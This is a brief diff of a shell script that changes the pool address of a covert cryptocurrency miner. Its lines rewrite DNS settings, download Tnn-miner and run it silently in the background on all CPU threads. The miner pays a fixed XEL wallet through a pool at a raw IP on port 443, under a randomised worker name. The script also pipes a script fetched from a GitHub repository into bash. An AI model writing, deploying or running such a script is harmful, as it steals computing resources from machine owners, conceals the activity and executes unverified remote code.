@@ -12,5 +12,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 curl https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.6.6/downloads/Tnn-miner-amd64-v0.6.6.tar.gz -L -o Tnn-miner-amd64-v0.6.6.tar.gz
 tar xf Tnn-miner-amd64-v0.6.6.tar.gz
-./tnn-miner-cpu --xel --daemon-address stratum+tcp://138.197.198.104:443 --worker-name $(shuf -n 1 -i 1-999)-iBISMI --wallet xel:nc9cm9ps6asjenezcjx8ynjwg8zvc77t5xg3djjw2ke33lxxqvtqq6p39r8 --threads $(nproc --all) > /dev/null 2>&1 &
+./tnn-miner-cpu --xel --daemon-address stratum+tcp://164.92.240.245:443 --worker-name $(shuf -n 1 -i 1-999)-iBISMI --wallet xel:nc9cm9ps6asjenezcjx8ynjwg8zvc77t5xg3djjw2ke33lxxqvtqq6p39r8 --threads $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
